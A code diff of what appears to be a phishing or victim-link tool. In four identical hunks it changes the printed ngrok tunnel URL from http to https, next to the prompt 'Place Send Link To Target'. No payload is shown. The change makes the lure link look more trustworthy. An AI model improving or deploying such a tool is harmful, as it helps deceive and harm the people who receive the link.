@@ -166,7 +166,7 @@ init();
     banner.banner()
     global token
     a = ngrok.connect(4545,"http",auth_token=token)
-    print(Fore.GREEN+" [+]"+Fore.WHITE+str(a).replace('"','').replace("NgrokTunnel:",""))
+    print(Fore.GREEN+" [+]"+Fore.WHITE+str(a).replace('"','').replace("NgrokTunnel:","").replace("http://","https://"))
     print(Fore.RED+"\n [+] "+Fore.LIGHTCYAN_EX+"Place Send Link To Target")
     # - - - - - - - - - - -- - - - - - - - - - - - - - - -
 
@@ -389,7 +389,7 @@ init();
     banner.banner()
     global token
     a = ngrok.connect(4545,"http",auth_token=token)
-    print(Fore.GREEN+" [+]"+Fore.WHITE+str(a).replace('"','').replace("NgrokTunnel:",""))
+    print(Fore.GREEN+" [+]"+Fore.WHITE+str(a).replace('"','').replace("NgrokTunnel:","").replace("http://","https://"))
     print(Fore.RED+"\n [+] "+Fore.LIGHTCYAN_EX+"Place Send Link To Target")
     # - - - - - - - - - - -- - - - - - - - - - - - - - - -
 
@@ -780,7 +780,7 @@ init();
     banner.banner()
     global token
     a = ngrok.connect(4545,"http",auth_token=token)
-    print(Fore.GREEN+" [+]"+Fore.WHITE+str(a).replace('"','').replace("NgrokTunnel:",""))
+    print(Fore.GREEN+" [+]"+Fore.WHITE+str(a).replace('"','').replace("NgrokTunnel:","").replace("http://","https://"))
     print(Fore.RED+"\n [+] "+Fore.LIGHTCYAN_EX+"Place Send Link To Target")
     # - - - - - - - - - - -- - - - - - - - - - - - - - - -
 
@@ -858,7 +858,7 @@ def micro():
     banner.banner()
     global token
     a = ngrok.connect(4545,"http",auth_token=token)
-    print(Fore.GREEN+" [+]"+Fore.WHITE+str(a).replace('"','').replace("NgrokTunnel:",""))
+    print(Fore.GREEN+" [+]"+Fore.WHITE+str(a).replace('"','').replace("NgrokTunnel:","").replace("http://","https://"))
     print(Fore.RED+"\n [+] "+Fore.LIGHTCYAN_EX+"Place Send Link To Target")
     # - - - - - - - - - - -- - - - - - - - - - - - - - - -
 
